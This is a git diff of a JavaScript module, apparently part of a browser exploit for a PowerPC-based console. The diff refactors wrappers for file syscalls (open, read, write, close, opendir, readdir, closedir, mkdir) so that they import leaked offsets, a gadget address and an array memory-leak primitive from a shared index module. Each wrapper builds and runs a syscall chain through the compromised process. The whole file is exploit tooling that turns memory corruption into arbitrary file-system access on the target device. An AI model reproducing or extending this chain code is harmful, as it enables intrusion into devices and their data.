@@ -1,5 +1,11 @@
+var zs = require('../index.js');
+
+var ChainBuilder = require('../ChainBuilder.js');
+var Util = require('../Util.js');
+
+
 function open(strpath) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataStr("path", Util.ascii(strpath))
 		.addDataInt32("errno")
 		.addDataInt32("fd")
@@ -7,7 +13,7 @@ function open(strpath) {
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	var fd = chain.getDataInt32("fd");
@@ -16,7 +22,7 @@ function open(strpath) {
 }
 
 function read(fd, size) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataBuffer("buffer", size)
 		.addDataInt32("errno")
 		.addDataInt64("read")
@@ -24,7 +30,7 @@ function read(fd, size) {
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	var read = chain.getDataInt64("read");
@@ -34,7 +40,7 @@ function read(fd, size) {
 }
 
 function write(fd, buffer, size) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataStr("buffer", buffer)
 		.addDataInt32("errno")
 		.addDataInt64("written")
@@ -42,7 +48,7 @@ function write(fd, buffer, size) {
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	var written = chain.getDataInt64("written");
@@ -51,13 +57,13 @@ function write(fd, buffer, size) {
 }
 
 function close(fd) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataInt32("errno")
 		.syscall(0x324, fd)
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	
@@ -65,7 +71,7 @@ function close(fd) {
 }
 
 function opendir(strpath) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataStr("path", Util.ascii(strpath))
 		.addDataInt32("errno")
 		.addDataInt32("fd")
@@ -73,7 +79,7 @@ function opendir(strpath) {
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	var fd = chain.getDataInt32("fd");
@@ -82,7 +88,7 @@ function opendir(strpath) {
 }
 
 function readdir(fd) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataInt32("errno")
 		.addDataBuffer("dir", 258)
 		.addDataInt64("read")
@@ -90,7 +96,7 @@ function readdir(fd) {
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	var type = 0;
@@ -111,13 +117,13 @@ function readdir(fd) {
 }
 
 function closedir(fd) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataInt32("errno")
 		.syscall(0x327, fd)
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	
@@ -125,16 +131,28 @@ function closedir(fd) {
 }
 
 function mkdir(strpath) {
-	var chain = new ChainBuilder(offsets, addrGtemp)
+	var chain = new ChainBuilder(zs.offsets, zs.addrGtemp)
 		.addDataStr("path", Util.ascii(strpath))
 		.addDataInt32("errno")
 		.syscall(0x32B, "path", 0o700)
 		.storeR3("errno")
 		.create();
 	
-	chain.prepare(arrayLeaker).execute();
+	chain.prepare(zs.zsArray).execute();
 	
 	var errno = chain.getDataInt32("errno");
 	
 	return { errno: errno };
+}
+
+
+module.exports = {
+	open,
+	read,
+	write,
+	close,
+	opendir,
+	readdir,
+	closedir,
+	mkdir,
 }
